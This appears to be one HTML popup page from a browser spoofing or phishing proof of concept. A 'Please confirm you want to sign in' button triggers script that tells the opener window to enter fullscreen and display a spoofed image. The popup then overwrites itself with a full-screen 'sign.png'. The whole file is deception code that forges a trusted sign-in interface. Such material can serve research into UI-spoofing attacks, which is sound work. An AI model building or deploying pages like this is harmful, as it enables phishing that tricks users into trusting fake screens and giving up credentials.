<!DOCTYPE HTML>
<html>
<head>
<meta charset="UTF-8">
<title>Confirm</title>

<script>
function spoof() {

    // Tell main window to enter fullscreen + spoof image
    try {
        window.opener.goFullscreenAndSpoof();
    } catch(e) {
        console.warn("opener not accessible", e);
    }

    // Replace popup content with sign page
    document.open();
    document.write(`
        <img src="sign.png" style="width:100%;height:100%;object-fit:cover;">
    `);
    document.close();
}
</script>

</head>
<body>
<center>
    <br>
    <h1>
        Please confirm you want to sign in<br><br>
        <button onclick="spoof();">Confirm</button>
    </h1>
</center>
</body>
</html>
